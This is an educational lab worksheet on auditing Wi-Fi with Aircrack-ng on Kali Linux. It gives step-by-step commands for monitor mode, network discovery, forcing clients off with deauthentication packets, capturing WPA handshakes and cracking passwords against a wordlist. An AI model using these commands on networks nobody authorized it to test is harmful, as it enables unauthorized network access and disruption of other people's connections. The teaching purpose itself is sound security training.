# Project 5: Auditing and Attacking a Wi-Fi Network with Aircrack-ng on Kali Linux

## Introduction
In this project, you will learn how to use Aircrack-ng, a suite of tools for auditing and attacking Wi-Fi networks. This project will help you understand the security vulnerabilities in Wi-Fi networks and how to exploit them ethically. By the end of this project, you will be able to perform network discovery, capture packets, and crack WEP/WPA/WPA2 passwords.

## Pre-requisites
- Basic understanding of wireless networking concepts (SSID, BSSID, channels).
- Familiarity with using the command line interface (CLI).
- Basic knowledge of Wi-Fi security protocols (WEP, WPA, WPA2).

## Lab Set-up and Tools

### Diagram
Here is a simple network diagram for this lab setup:

+------------------+ +------------------+
| Attacker | | Wi-Fi Router |
| Kali Machine |<----->| (Target Network)|
| (192.168.1.100) | | (192.168.1.1) |
+------------------+ +------------------+
|
|
+------------------+
| Target Device |
| (Wi-Fi Client) |
| (192.168.1.101)|
+------------------+


### Tools
- **Kali Linux**: A Debian-derived Linux distribution designed for digital forensics and penetration testing.
- **Aircrack-ng**: A suite of tools for Wi-Fi network auditing and penetration testing (pre-installed on Kali Linux).
- **Wi-Fi Adapter**: A compatible Wi-Fi adapter that supports monitor mode.

### Installation
Aircrack-ng is pre-installed on Kali Linux. You can verify the installation or update it using the following command:
```sh
sudo apt-get update && sudo apt-get install aircrack-ng
```

## Tasks

### Task 1: Set Up Wi-Fi Adapter in Monitor Mode
Step1: Identify your Wi-Fi adapter:
```sh
iwconfig
```
Step2: Set your Wi-Fi adapter to monitor mode. Replace wlan0 with your Wi-Fi adapter's interface name:
```sh
sudo airmon-ng start wlan0
```
Expected Output: Your Wi-Fi adapter should now be in monitor mode, typically renamed to wlan0mon.

### Task 2: Discover Wi-Fi Networks
Step1: Use airodump-ng to discover nearby Wi-Fi networks:
```sh
sudo airodump-ng wlan0mon
```
Expected Output: A list of Wi-Fi networks in range, displaying SSIDs, BSSIDs, channels, and signal strengths.

### Task 3: Capture Handshake Packets
Step1: Choose a target network (preferably your own for ethical reasons) and capture handshake packets. Replace XX:XX:XX:XX:XX:XX with the target network's BSSID and X with the channel number:
```sh
sudo airodump-ng --bssid XX:XX:XX:XX:XX:XX -c X -w capture wlan0mon
```
Step2: Deauthenticate a connected client to force a handshake capture. Replace XX:XX:XX:XX:XX:XX with the target network's BSSID and YY:YY:YY:YY:YY:YY with the client's MAC address:
```sh
sudo aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX:XX -c YY:YY:YY:YY:YY:YY wlan0mon
```
Expected Output: Handshake packets should be captured and saved in the capture file.

### Task 4: Crack WEP/WPA/WPA2 Passwords
Step1: Use aircrack-ng to crack the captured handshake file. Provide a wordlist for the attack. For example, use the default wordlist provided by Kali Linux:
```sh
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```
Expected Output: If the password is in the wordlist, aircrack-ng should successfully crack it and display the key.

### Task 5: Analyze Captured Packets
Step1: Use Wireshark to analyze the captured packets for detailed insights:
```sh
sudo wireshark capture-01.cap
```
Expected Output: A detailed view of the captured packets, including information about the handshake process and any other traffic.


## Additional Resources
Aircrack-ng Documentation
Kali Linux Documentation
Wireshark Documentation
Securing Your Wi-Fi Network


This project will help you understand how to audit and attack Wi-Fi networks using Aircrack-ng on Kali Linux, and provide you with the skills to improve the security of your own wireless networks.
